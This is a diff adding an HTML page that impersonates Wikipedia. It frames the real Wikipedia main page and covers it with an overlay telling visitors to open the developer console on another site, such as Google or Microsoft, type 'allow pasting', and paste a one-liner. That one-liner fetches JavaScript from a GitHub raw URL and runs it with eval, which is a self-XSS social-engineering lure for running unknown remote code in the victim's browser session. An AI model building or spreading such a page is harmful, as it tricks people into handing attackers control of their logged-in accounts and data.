@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wikipedia</title>
+    <link rel="shortcut icon" href="https://www.wikipedia.org/static/favicon/wikipedia.ico" type="image/x-icon">
+    
+    <style>
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+
+        iframe {
+            border: none;
+            height: 100%;
+            width: 100%;
+            display: block;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        #steps {
+            background: black;
+            color: white;
+            padding: 20px 25px;
+            border-radius: 10px;
+            max-width: 350px;
+            text-align: left;
+            font-size: 14px;
+        }
+
+        #main-title {
+            text-align: center !important;
+        }
+
+        #steps code {
+            display: block;
+            background: #222;
+            margin-top: 10px;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            text-align: left;
+            word-break: break-all;
+
+        }
+    </style>
+</head>
+
+<body>
+    <iframe src="https://en.wikipedia.org/wiki/Main_Page"></iframe>
+
+    <div id="overlay">
+        <div id="steps">
+            <div id="main-title"><strong>To Proceed Follow The Instructions Below:</strong> </div>
+            <p><strong>1st Step: </strong>Go to any random website like <a href="https://www.google.com" target ="_blank">Google</a>, or <a href="https://www.microsoft.com/" target="_blank">Microsoft</a>.</p>
+            <p><strong>2nd Step: </strong>Press F12 or Ctrl+Shift+I and go to the console tab, then type in "allow pasting" into it.</p>
+            <p><strong>3rd Step: </strong>Paste the below into the console:</p>
+            <code>
+(async u => eval(await (await fetch(u)).text()))('https://raw.githubusercontent.com/somerandomguyonhere/cataredogs/refs/heads/main/consolebox.js');
+            </code>
+        </div>
+    </div>
+
+
+</body>
+
+</html>
